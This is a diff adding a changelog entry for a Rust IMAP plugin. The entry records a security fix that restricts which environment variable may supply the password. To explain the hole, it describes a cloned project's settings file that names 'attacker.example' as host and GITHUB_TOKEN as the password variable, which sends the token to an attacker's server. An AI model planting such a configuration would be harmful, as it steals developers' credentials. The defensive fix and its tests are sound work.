@@ -253,4 +253,22 @@ version; it stays 0.1.x until the next release.
   not keep for itself.
 - `seleniumbase-rs-plugin`: `PluginError` has two new variants, `Panicked` and
   `Reentrant`.
+- `seleniumbase-rs-plugin-imap` (security): `password_env` must now start with
+  `IMAP_`, `MAIL_` or `SB_` (capitals, as written), after the existing rule that
+  it is a plain variable name. The plugin sends the password to `host`, so a
+  settings file that came with a cloned project could name
+  `host = "attacker.example"` and `password_env = "GITHUB_TOKEN"` and have that
+  token sent to the attacker's server (over TLS, checked against the attacker's
+  own certificate) once the operator passed `--plugin imap`. Any other name is
+  refused when the plugin is built, before the variable is read, with
+  "imap: `password_env` must name a variable starting with IMAP_, MAIL_ or SB_
+  (got `GITHUB_TOKEN`)": the message names the rule and the variable's name,
+  never a value. A configuration that named another variable, such as `PATH` in
+  the registry tests, must rename it. The README, the `ImapConfig` and crate
+  documentation and the tests say the same; the registry tests of
+  `seleniumbase-rs-plugins-builtin` use `SB_BUILTIN_IMAP_TEST_PASSWORD`, which a
+  child process of the test binary has set (a test cannot set a variable itself
+  in edition 2024), and add a test that a set variable outside the prefixes is
+  refused.
+
 
